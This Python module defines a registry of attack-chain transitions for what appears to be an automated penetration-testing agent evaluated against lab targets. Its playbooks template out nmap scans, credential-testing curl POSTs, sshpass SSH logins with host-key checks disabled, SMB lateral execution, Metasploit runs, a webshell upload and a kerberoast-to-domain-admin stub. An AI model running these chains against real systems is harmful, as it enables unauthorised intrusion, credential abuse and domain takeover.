"""Declarative kill-chain edge registry.

Each edge is one verified state transition:

    {
        "edge_id": ...,
        "from_state": ...,          # AttackState value
        "to_state": ...,            # AttackState value
        "playbook": [               # MCP tool calls, in order
            {"tool": "<mcp tool name>", "args": {..., "{placeholder}": ...}},
        ],
        "verify": [ ... ],          # check specs, SAME vocabulary as Feature-1
                                    # oracle flags (tools/eval_checks.py) —
        "evidence_type": ...,
    }

Playbook ``args`` values may contain ``{target_ip}`` / ``{user}`` /
``{password}`` style placeholders resolved from the transition-context dict
(``str.format_map`` over a safe subset: only ``str`` values are formatted, so
a context dict cannot inject structure).

``verify`` specs are executed by the shared verifier
(:func:`tools.eval_harness.verify_flag_check`) — the single verifier-spec
surface. There is deliberately NO unverified-transition path in the machine.

Initial library ships only known-good chains; ``kerberoast_to_da`` is a
documented stub (needs a DC environment) and is excluded from BFS plans
until it has a working verify story.
"""

from __future__ import annotations

from typing import Any

from tools.killchain.states import AttackState

Edge = dict[str, Any]

EDGES: dict[str, Edge] = {
    # -- baseline reachability edges (discovered -> creds_in_hand) ---------
    "tcp_reachable": {
        "edge_id": "tcp_reachable",
        "from_state": AttackState.DISCOVERED.value,
        "to_state": AttackState.REACHABLE.value,
        "description": "Confirm at least one TCP port is open on the target",
        "playbook": [
            {
                "tool": "run_exploit_terminal",
                "args": {"command": "nmap -Pn -p {port} {target_ip}"},
            }
        ],
        "verify": [
            {"id": "port_open_probe", "type": "http_request", "url": "http://{target_ip}:{port}/", "expect_status": 200}
        ],
        "evidence_type": "port_scan",
    },
    "service_confirmed": {
        "edge_id": "service_confirmed",
        "from_state": AttackState.REACHABLE.value,
        "to_state": AttackState.SERVICE_ACCESS.value,
        "description": "Fingerprint an exposed service (version/banner identified)",
        "playbook": [
            {
                "tool": "get_service_fingerprint",
                "args": {"target_ip": "{target_ip}", "port": "{port}"},
            }
        ],
        "verify": [
            {
                "id": "service_banner_probe",
                "type": "http_request",
                "url": "http://{target_ip}:{port}/",
                "expect_status": 200,
            }
        ],
        "evidence_type": "service_fingerprint",
    },
    "cred_harvest": {
        "edge_id": "cred_harvest",
        "from_state": AttackState.SERVICE_ACCESS.value,
        "to_state": AttackState.CREDS_IN_HAND.value,
        "description": "Validate a credential pair against an exposed service",
        "playbook": [
            {
                "tool": "run_exploit_terminal",
                "args": {
                    "command": "curl -s -X POST -d 'username={user}&password={password}' http://{target_ip}:{port}/login",
                },
            }
        ],
        "verify": [
            {
                "id": "cred_validated",
                "type": "http_login",
                "url": "http://{target_ip}:{port}/login",
                "user": "{user}",
                "password": "{password}",
            }
        ],
        "evidence_type": "valid_credentials",
    },
    # -- credential-driven transitions -------------------------------------
    "cred_ssh_login": {
        "edge_id": "cred_ssh_login",
        "from_state": AttackState.CREDS_IN_HAND.value,
        "to_state": AttackState.SHELL_AS_USER.value,
        "description": "SSH login with a credential from creds_in_hand",
        "playbook": [
            {
                "tool": "run_exploit_terminal",
                "args": {
                    "command": "sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {user}@{target_ip} 'id'",
                },
            }
        ],
        "verify": [{"id": "ssh_uid_probe", "type": "shell_command", "exec": "id", "expect_stdout": "uid="}],
        "evidence_type": "authenticated_shell",
    },
    "cred_smb_login": {
        "edge_id": "cred_smb_login",
        "from_state": AttackState.CREDS_IN_HAND.value,
        "to_state": AttackState.SERVICE_ACCESS.value,
        "description": "SMB session with a credential (lateral_exec / crackmapexec-style)",
        "playbook": [
            {
                "tool": "lateral_exec",
                "args": {
                    "target_ip": "{target_ip}",
                    "username": "{user}",
                    "password": "{password}",
                    "command": "whoami",
                },
            }
        ],
        "verify": [{"id": "smb_session_probe", "type": "shell_command", "exec": "whoami", "expect_stdout": "\\"}],
        "evidence_type": "authenticated_share",
    },
    "cred_http_login": {
        "edge_id": "cred_http_login",
        "from_state": AttackState.CREDS_IN_HAND.value,
        "to_state": AttackState.SERVICE_ACCESS.value,
        "description": "Web login with a credential pair, verified by HTTP response",
        "playbook": [],
        "verify": [
            {
                "id": "http_login_probe",
                "type": "http_login",
                "url": "http://{target_ip}:{port}/login",
                "user": "{user}",
                "password": "{password}",
            }
        ],
        "evidence_type": "authenticated_web_session",
    },
    "msf_validated_exploit": {
        "edge_id": "msf_validated_exploit",
        "from_state": AttackState.SERVICE_ACCESS.value,
        "to_state": AttackState.SHELL_AS_USER.value,
        "description": "Metasploit module run against an exposed service, session verified",
        "playbook": [
            {
                "tool": "run_msf_module",
                "args": {"module": "{module}", "target_ip": "{target_ip}", "options": "{options}"},
            }
        ],
        "verify": [{"id": "msf_session_probe", "type": "shell_command", "exec": "id", "expect_stdout": "uid="}],
        "evidence_type": "exploit_session",
    },
    "file_upload_webshell": {
        "edge_id": "file_upload_webshell",
        "from_state": AttackState.SERVICE_ACCESS.value,
        "to_state": AttackState.SHELL_AS_USER.value,
        "description": "Upload a webshell to a writable web root and probe it over HTTP",
        "playbook": [
            {
                "tool": "run_exploit_terminal",
                "args": {
                    "command": "curl -s -F 'file=@{payload_path}' http://{target_ip}:{port}/upload.php",
                },
            }
        ],
        "verify": [
            {
                "id": "webshell_probe",
                "type": "http_request",
                "url": "http://{target_ip}:{port}/{shell_path}",
                "expect_status": 200,
            }
        ],
        "evidence_type": "webshell",
    },
    # STUB: needs a DC environment (kerberoast + hash crack). Kept out of BFS
    # plans (see STUB_EDGES) until its verify story works end to end.
    "kerberoast_to_da": {
        "edge_id": "kerberoast_to_da",
        "from_state": AttackState.DOMAIN_CREDS.value,
        "to_state": AttackState.DA.value,
        "description": "STUB: kerberoast a DA-targetable SPN, crack the TGS, verify DA rights",
        "playbook": [
            {
                "tool": "kerberoast",
                "args": {"target_ip": "{target_ip}", "username": "{user}", "password": "{password}"},
            }
        ],
        "verify": [
            {
                "id": "da_group_probe",
                "type": "shell_command",
                "exec": "net group 'Domain Admins' /domain",
                "expect_stdout": "Domain Admins",
            }
        ],
        "evidence_type": "domain_admin_access",
    },
}

# Edges excluded from BFS planning because they are stubs.
STUB_EDGES = frozenset({"kerberoast_to_da"})


def get_edge(edge_id: str) -> Edge | None:
    """Return the registered edge by id, or None."""
    return EDGES.get(edge_id)


def edges_from(state: str | AttackState) -> list[Edge]:
    """All registered (non-stub) edges whose ``from_state`` matches ``state``.

    Tolerant: an unparseable state yields ``[]`` rather than raising.
    """
    try:
        key = AttackState.parse(state).value
    except ValueError:
        return []
    return [e for e in EDGES.values() if e["from_state"] == key and e["edge_id"] not in STUB_EDGES]


def all_edges(*, include_stubs: bool = False) -> list[Edge]:
    """All registered edges; stubs only when ``include_stubs``."""
    return [e for e in EDGES.values() if include_stubs or e["edge_id"] not in STUB_EDGES]


def resolve_placeholders(value: Any, context: dict[str, Any]) -> Any:
    """Resolve ``{placeholder}`` tokens in playbook arg values from ``context``.

    Only ``str`` values are formatted (a context dict cannot inject structure);
    a missing placeholder is left as-is so the failure is visible in the tool
    call rather than silently swallowed.
    """

    class _SafeDict(dict):
        def __missing__(self, key: str) -> str:  # noqa: D105
            return "{" + key + "}"

    if isinstance(value, str):
        try:
            return value.format_map(_SafeDict({k: v for k, v in (context or {}).items() if isinstance(v, str)}))
        except (ValueError, IndexError):
            return value
    return value
